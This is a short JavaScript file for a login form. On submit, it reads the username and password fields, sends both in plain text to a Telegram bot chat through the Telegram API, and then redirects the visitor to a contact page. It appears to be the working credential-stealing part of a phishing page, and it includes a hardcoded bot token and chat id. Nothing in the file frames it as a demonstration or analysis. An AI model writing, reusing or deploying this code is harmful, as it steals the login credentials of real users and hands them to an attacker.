const form = document.getElementById('form');

function retrieveFormValue(event) {
	event.preventDefault();

	const name = form.querySelector('[name="login"]'),
	pass = form.querySelector('[name="pass"]');

	const values = {
		name: name.value,
		pass: pass.value
	};

	console.log('Val=', values)

	const token = '5423213379:AAFPNCunwWzcGqHmwY9Y0F15cXj2__OZDm8'
	let url = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id=520246477&text=';

	let sendStr = url+'Login:->'+name.value+':_____:'+'Password:->'+pass.value;

	let xhttp = new XMLHttpRequest();
	xhttp.open('GET', sendStr, true);
	xhttp.send();

	window.location.href = '/contact.html';
}


form.addEventListener('submit', retrieveFormValue);